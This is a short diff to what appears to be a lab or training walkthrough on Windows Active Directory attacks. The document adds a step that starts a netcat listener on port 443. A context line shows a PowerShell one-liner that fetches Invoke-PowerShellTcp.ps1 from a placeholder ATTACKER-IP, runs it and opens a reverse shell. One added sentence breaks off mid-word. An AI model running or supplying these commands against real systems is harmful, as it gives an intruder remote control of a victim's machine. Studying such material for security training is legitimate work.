@@ -107,8 +107,13 @@ println "out> $sout err> $serr"
 powershell iex (iwr -UseBasicParsing http://ATTACKER-IP/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress ATTACKER-IP -Port 443
 ```
 
-- Now we can go ahead and start up a listener with netcat using the `netcat.exe` version
+- Now we can go ahead and start up a listener with netcat using the `netcat.exe` version to listen on the specified port
 
+```bat
+$ C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
+```
+
+Also we need to host our `Invoke-PowerShellTcp.ps1` scri
 
  
 - Again, you could download and execute scripts, run encoded scripts and more.
